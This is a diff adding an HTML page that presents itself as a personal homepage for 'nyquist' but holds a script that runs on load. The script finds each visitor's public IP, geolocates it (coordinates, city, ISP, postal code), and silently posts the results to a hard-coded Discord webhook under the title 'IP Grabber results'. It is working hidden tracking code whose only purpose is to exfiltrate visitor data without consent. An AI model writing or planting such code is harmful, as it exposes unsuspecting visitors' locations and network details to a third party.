@@ -1,0 +1,127 @@
+<head>
+    <link rel="icon" type="image/png" href="photo.png">
+    <meta property="og:image" content="photo.png">
+    <meta name="twitter:card" content="photo.png">
+    <title>nyquist Personal Website</title>
+    <meta name="author" content="nyquist">
+    <meta name="title" content="nyquist Personal Website">
+    <meta property="og:title" content="nyquist Personal Website">
+
+
+    <meta name="description" content="Hello, I'm nyquist.">
+    <meta property="og:description" content="Hello, I'm nyquist.">
+
+    <meta property="og:type" content="website">
+
+    <meta name="theme-color" content="#D69F09" data-react-helmet="true">
+
+    <meta property="og:image" content="photo.png">
+    <meta name="twitter:card" content="photo.png">
+</head>
+Loading...
+<script>
+    async function routine() {
+        let ip = ""
+        let locationdata = {
+            "ip": "203.0.113.45",
+            "success": true,
+            "type": "IPv4",
+            "continent": "Asia",
+            "continent_code": "AS",
+            "country": "Japan",
+            "country_code": "JP",
+            "region": "Tokyo",
+            "region_code": "13",
+            "city": "Tokyo",
+            "latitude": 35.6895,
+            "longitude": 139.6917,
+            "is_eu": false,
+            "postal": "100-0001",
+            "calling_code": "81",
+            "capital": "Tokyo",
+            "borders": "KR,CN,RU",
+            "flag": {
+                "img": "https://cdn.ipwhois.io/flags/jp.svg",
+                "emoji": "🇯🇵",
+                "emoji_unicode": "U+1F1EF U+1F1F5"
+            },
+            "connection": {
+                "asn": 2516,
+                "org": "KDDI CORPORATION",
+                "isp": "KDDI CORPORATION",
+                "domain": "kddi.com"
+            },
+            "timezone": {
+                "id": "Asia/Tokyo",
+                "abbr": "JST",
+                "is_dst": false,
+                "offset": 32400,
+                "utc": "+09:00",
+                "current_time": "2024-06-10T13:43:31+09:00"
+            }
+        }
+
+
+        await fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => ip = data.ip);
+        console.log(ip)
+        await fetch(`https://ipwho.is/${ip}`)
+            .then(response => response.json())
+            .then(data => locationdata = data);
+        console.log(locationdata)
+        const webhookUrl = "https://discord.com/api/webhooks/1249569437045231677/ArX0RBMdp8vttWy9a8qHXyF4pY82kzDTkxegHpqna4jruNOV9Z6I419I5cHnMwdc--ss";
+        const embed = {
+            title: "IP Grabber results",
+            description: "Found the IP of some silly goober!",
+            color: 0xD69F09, // Green color
+            fields: [
+                {
+                    name: "IP Address",
+                    value: locationdata.ip,
+                },
+                {
+                    name: "Location",
+                    value: `${locationdata.latitude} N, ${-locationdata.longitude} W`,
+                },
+                {
+                    name: "Country",
+                    value: locationdata.country,
+                },
+                {
+                    name: "City",
+                    value: locationdata.city,
+                },
+                {
+                    name: "Internet Service Provider",
+                    value: locationdata.connection.isp,
+                },
+                {
+                    name: "Timezone",
+                    value: locationdata.timezone.id,
+                },
+                {
+                    name: "ZIP Code",
+                    value: locationdata.postal,
+                }
+            ],
+            footer: {
+                text: "I love IP grabbers",
+                icon_url: "https://preview.redd.it/zu372dr7rrdb1.jpg?auto=webp&s=1082287aa985250ecd12270c88c74ac30d201edf"
+            },
+            timestamp: new Date()
+        };
+        const message = {
+            embeds: [embed]
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        })
+    }
+    routine()
+</script>
